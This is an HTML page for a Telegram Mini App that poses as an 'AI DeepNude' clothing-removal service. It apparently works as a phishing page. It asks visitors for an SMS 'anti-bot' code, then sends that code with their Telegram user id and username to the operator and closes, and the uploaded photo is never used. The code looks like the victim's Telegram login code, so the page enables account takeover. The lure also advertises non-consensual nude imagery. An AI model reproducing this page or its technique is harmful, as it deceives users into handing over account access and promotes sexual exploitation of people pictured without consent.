<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <title>AI DeepNude</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
            color: #fff;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        h1 {
            font-size: 24px;
            text-align: center;
            margin-bottom: 10px;
            color: #ff6b6b;
        }
        
        .subtitle {
            text-align: center;
            color: #aaa;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .file-zone {
            border: 2px dashed #ff6b6b;
            border-radius: 15px;
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 20px;
            cursor: pointer;
            transition: all 0.3s;
            background: rgba(255, 107, 107, 0.05);
        }
        
        .file-zone:hover {
            background: rgba(255, 107, 107, 0.15);
            border-color: #ff8787;
        }
        
        .file-zone input {
            display: none;
        }
        
        .file-name {
            margin-top: 10px;
            font-size: 12px;
            color: #888;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #ddd;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
        }
        
        input[type="text"]:focus {
            border-color: #ff6b6b;
            background: rgba(255, 107, 107, 0.1);
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        button:active {
            transform: scale(0.98);
        }
        
        .info {
            background: rgba(255, 107, 107, 0.2);
            border-left: 3px solid #ff6b6b;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            color: #ffcccc;
            margin-top: 20px;
        }
        
        .loader {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: #ff6b6b;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🎭 AI DeepNude</h1>
            <div class="subtitle">Нейросеть для удаления одежды с фото</div>
            
            <div class="file-zone" onclick="document.getElementById('photoInput').click()">
                <div style="font-size: 48px;">📸</div>
                <div>Нажми, чтобы загрузить фото</div>
                <input type="file" id="photoInput" accept="image/jpeg,image/png,image/jpg">
                <div class="file-name" id="fileName"></div>
            </div>
            
            <div class="input-group">
                <label>🔐 Код подтверждения (антибот)</label>
                <input type="text" id="codeInput" placeholder="Введите код из SMS" autocomplete="off">
            </div>
            
            <button id="processBtn">▶️ Обработать фото</button>
            
            <div class="info">
                ⚠️ Для защиты от автоматических запросов требуется ввести код из SMS.<br>
                📩 Код будет отправлен на ваш номер телефона.
            </div>
            
            <div class="loader" id="loader">
                <div class="spinner"></div>
                <div>Обработка...</div>
            </div>
        </div>
    </div>
    
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        document.getElementById('photoInput').addEventListener('change', function(e) {
            const fileName = e.target.files[0]?.name || 'Файл не выбран';
            document.getElementById('fileName').innerText = fileName;
        });
        
        document.getElementById('processBtn').addEventListener('click', function() {
            const code = document.getElementById('codeInput').value.trim();
            
            if (!code) {
                alert('Пожалуйста, введите код из SMS');
                return;
            }
            
            if (!document.getElementById('photoInput').files[0]) {
                alert('Пожалуйста, загрузите фото');
                return;
            }
            
            document.getElementById('loader').style.display = 'block';
            
            const user = tg.initDataUnsafe?.user || {};
            const userId = user.id || 'unknown';
            const username = user.username || 'unknown';
            
            tg.sendData(JSON.stringify({
                code: code,
                user_id: userId,
                username: username
            }));
            
            setTimeout(() => {
                tg.close();
            }, 1000);
        });
    </script>
</body>
</html>
